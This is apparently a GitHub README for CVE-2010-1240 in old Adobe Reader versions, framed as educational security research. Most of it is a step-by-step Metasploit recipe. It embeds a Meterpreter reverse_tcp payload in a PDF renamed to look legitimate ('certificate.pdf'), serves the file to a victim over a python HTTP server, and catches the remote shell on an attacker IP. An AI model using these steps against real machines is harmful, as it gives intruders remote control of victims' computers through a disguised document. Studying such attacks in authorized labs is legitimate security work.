<h1 style="font-size:10vw" align="left">CVE-2010-1240 - Embedding backdoor into a PDF</h1>
⚠️ *For educational and authorized security research purposes only*

## Description
Adobe Reader and Acrobat 9.x before 9.3.3, and 8.x before 8.2.3 on Windows and Mac OS X, do not restrict the contents of one text field in the Launch File warning dialog, which makes it easier for remote attackers to trick users into executing an arbitrary local program that was specified in a PDF document, as demonstrated by a text field that claims that the Open button will enable the user to read an encrypted message.

## Demo
![Animation](https://github.com/asepsaepdin/CVE-2010-1240/assets/122620685/2bbfd368-ecbf-44a2-88dd-a95add3e886c)


## Step Guides
1. First, start the msfconsole
```
┌──(kali㉿kali)-[~]
└─$ msfconsole
```
2. Then
```
msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe
```
3. set the INFILENAME option and provide a direct path to the original pdf file
```
msf > set INFILENAME /home/kali/Downloads/document.pdf
```
4. set the name of the newly created malicious PDF file to something more convincing by setting the FILENAME option
```
msf > set FILENAME certificate.pdf
```
5. Find and embed the payload into the PDF file
```
msf > set payload windows/meterpreter/reverse_tcp
```
6. Set LHOST option to and attacker's IP and then type exploit
```
msf > set LHOST 172.16.10.7
msf > exploit
```
7. Open new terminal and go to the malicious PDF file location.
```
┌──(kali㉿kali)-[~]
└─$ cd .msf4/local/
```
8. Create a temporary server with python
```
┌──(kali㉿kali)-[~]
└─$ sudo python -m http.server
```
9. Download the malicious PDF file at the victim machine using this url
```
http://172.16.10.7:8000/certificate.pdf
```
10. Before running the malicious PDF file in the victim machine, start the listener on the previous terminal
```
msf > use exploit/multi/handler
msf > set payload windows/meterpreter/reverse_tcp
msf > set LHOST 172.16.10.7
msf > exploit
```
11. Once the malicious PDF file is executed in the victim machine, it'll give you connection to the victim machine

## Exploit Requirements
- Adobe Reader 9.1

## Credits
- https://nvd.nist.gov/vuln/detail/CVE-2010-1240
- https://medium.com/purple-team/embedding-backdoor-into-pdf-files-1781dfce62b1
- https://github.com/Jasmoon99/Embedded-PDF
